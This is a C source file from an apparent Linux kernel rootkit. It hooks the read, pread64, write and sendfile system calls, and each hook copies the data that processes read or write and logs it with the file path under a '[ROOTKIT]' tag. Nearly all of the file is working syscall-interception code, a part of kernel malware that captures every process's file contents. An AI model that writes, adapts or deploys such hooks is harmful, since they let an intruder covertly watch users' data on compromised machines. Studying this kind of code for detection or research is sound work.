#include "files.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <linux/err.h>
#include <linux/gfp.h>
#include <linux/mm.h>
#include <linux/printk.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>

// sys_read syscall hook handler
SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __user *, s_buf, size_t,
                      sz_count)
{
    long l_err             = 0;    // Error code of the copy functions
    long l_ret             = 0;    // Return value of the real syscall
    char *s_data           = NULL; // Data read from the user
    const char *s_pathname = NULL; // Pathname of the file

    pr_info("[ROOTKIT] read(%u, %p, %zu)", ui32_fd, s_buf, sz_count);

    l_ret = orig_read(p_regs);
    pr_cont(" = %ld\n", l_ret);

    s_pathname = fd_get_pathname(ui32_fd);
    IF_U (IS_ERR_OR_NULL(s_pathname)) {
        s_pathname = kstrdup_const("(error)", GFP_KERNEL);
    }
    pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
    kfree_const(s_pathname);

    IF_U (l_ret <= 0) {
        // No data read or error, return immediately
        IF_L (l_ret == 0) {
            pr_info("[ROOTKIT] * No data read\n");
        }
        else {
            pr_err("[ROOTKIT] * Error: %ld\n", l_ret);
        }
        return l_ret;
    }

    s_data = (char *)kvmalloc(l_ret + 1, GFP_KERNEL);

    IF_U (s_data == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory\n");
    }
    else {
        l_err = strncpy_from_user(s_data, s_buf, l_ret);

        IF_U (l_err < 0) {
            pr_err("[ROOTKIT] * Could not copy data from user\n");
        }
        else {
            s_data[l_ret] = '\0';
            pr_info("[ROOTKIT] * Data read: %s\n", s_data);
        }

        kvfree(s_data);
    }

    return l_ret;
}

// sys_pread64 syscall hook handler
SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char __user *, s_buf,
                      size_t, sz_count, loff_t, i64_pos)
{
    long l_err             = 0;    // Error code of the copy functions
    long l_ret             = 0;    // Return value of the real syscall
    char *s_data           = NULL; // Data read from the user
    const char *s_pathname = NULL; // Pathname of the file

    pr_info("[ROOTKIT] pread64(%u, %p, %zu, %lld)", ui32_fd, s_buf, sz_count, i64_pos);

    l_ret = orig_pread64(p_regs);
    pr_cont(" = %ld\n", l_ret);

    s_pathname = fd_get_pathname(ui32_fd);
    IF_U (IS_ERR_OR_NULL(s_pathname)) {
        s_pathname = kstrdup_const("(error)", GFP_KERNEL);
    }
    pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
    kfree_const(s_pathname);

    IF_U (l_ret <= 0) {
        // No data read or error, return immediately
        IF_L (l_ret == 0) {
            pr_info("[ROOTKIT] * No data read\n");
        }
        else {
            pr_err("[ROOTKIT] * Error: %ld\n", l_ret);
        }
        return l_ret;
    }

    s_data = (char *)kvmalloc(l_ret + 1, GFP_KERNEL);

    IF_U (s_data == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory\n");
    }
    else {
        l_err = strncpy_from_user(s_data, s_buf, l_ret);

        IF_U (l_err < 0) {
            pr_err("[ROOTKIT] * Could not copy data from user\n");
        }
        else {
            s_data[l_ret] = '\0';
            pr_info("[ROOTKIT] * Data read: %s\n", s_data);
        }

        kvfree(s_data);
    }

    return l_ret;
}

// sys_write syscall hook handler
SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const char __user *, s_buf,
                      size_t, sz_count)
{
    long l_err             = 0;    // Error code of the copy functions
    long l_ret             = 0;    // Return value of the real syscall
    char *s_data           = NULL; // Data written to the user
    const char *s_pathname = NULL; // Pathname of the file

    pr_info("[ROOTKIT] write(%u, %p, %zu)", ui32_fd, s_buf, sz_count);

    l_ret = orig_write(p_regs);
    pr_cont(" = %ld\n", l_ret);

    s_pathname = fd_get_pathname(ui32_fd);
    IF_U (IS_ERR_OR_NULL(s_pathname)) {
        s_pathname = kstrdup_const("(error)", GFP_KERNEL);
    }
    pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
    kfree_const(s_pathname);

    IF_U (l_ret <= 0) {
        // No data written or error, return immediately
        IF_L (l_ret == 0) {
            pr_info("[ROOTKIT] * No data written\n");
        }
        else {
            pr_err("[ROOTKIT] * Error: %ld\n", l_ret);
        }
        return l_ret;
    }

    s_data = (char *)kvmalloc(l_ret + 1, GFP_KERNEL);

    IF_U (s_data == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory\n");
    }
    else {
        l_err = strncpy_from_user(s_data, s_buf, l_ret);

        IF_U (l_err < 0) {
            pr_err("[ROOTKIT] * Could not copy data from user\n");
        }
        else {
            s_data[l_ret] = '\0';
            pr_info("[ROOTKIT] * Data to write: %s\n", s_data);
        }

        kvfree(s_data);
    }

    return l_ret;
}

// sys_sendfile syscall hook handler
SYSCALL_HOOK_HANDLER4(sendfile, orig_sendfile, p_regs, int, i32_out_fd, int, i32_in_fd,
                      loff_t __user *, p_offset, size_t, sz_count)
{
    long l_ret                 = 0;    // Return value of the real syscall
    const char *s_pathname_in  = NULL; // Pathname of the input file
    const char *s_pathname_out = NULL; // Pathname of the output file

    pr_info("[ROOTKIT] sendfile(%d, %d, %p, %zu)", i32_out_fd, i32_in_fd, p_offset, sz_count);

    l_ret = orig_sendfile(p_regs);
    pr_cont(" = %ld\n", l_ret);

    s_pathname_in  = fd_get_pathname(i32_in_fd);
    s_pathname_out = fd_get_pathname(i32_out_fd);
    IF_U (IS_ERR_OR_NULL(s_pathname_in)) {
        s_pathname_in = kstrdup_const("(error)", GFP_KERNEL);
    }
    IF_U (IS_ERR_OR_NULL(s_pathname_out)) {
        s_pathname_out = kstrdup_const("(error)", GFP_KERNEL);
    }
    pr_info("[ROOTKIT] *  In file name: %s\n", s_pathname_in);
    pr_info("[ROOTKIT] * Out file name: %s\n", s_pathname_out);

    return l_ret;
}
